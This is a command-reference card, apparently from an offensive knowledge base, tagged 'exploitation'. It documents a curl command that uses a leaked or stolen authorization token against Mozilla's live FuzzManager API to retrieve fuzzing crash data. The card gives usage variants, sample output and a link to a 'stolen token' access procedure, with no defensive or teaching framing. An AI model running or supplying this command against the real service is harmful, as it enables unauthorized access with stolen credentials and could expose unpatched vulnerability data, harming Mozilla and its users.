---
id: cmd-curl-api-read-001
data: >-
  curl -H "Authorization: Token YOUR_LEAKED_TOKEN"
  https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
tags:
  - curl
  - api
  - read
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.859Z'
verified: false
validated: true
submitted: true
---
# curl-api-read

## Command

```bash
curl -H "Authorization: Token YOUR_LEAKED_TOKEN" https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

## Description

Sends an authenticated GET request to the FuzzManager API to retrieve fuzzing crash data using a stolen token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Token YOUR_LEAKED_TOKEN"` | Header with token for auth | Yes |
| `https://.../api/v1/crashes/` | API endpoint for reading data | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Token abc123" https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

### Advanced Usage

```bash
curl -H "Authorization: Token abc123" -s https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/?limit=10  # Silent with pagination
```

## Expected Output

[{"id":1,"platform":"linux","signature":"crash@sig",...}, ...]

## Related

- [[commands/curl-api-write]]
- [[procedures/Access-FuzzManager-API-with-Stolen-Token]]
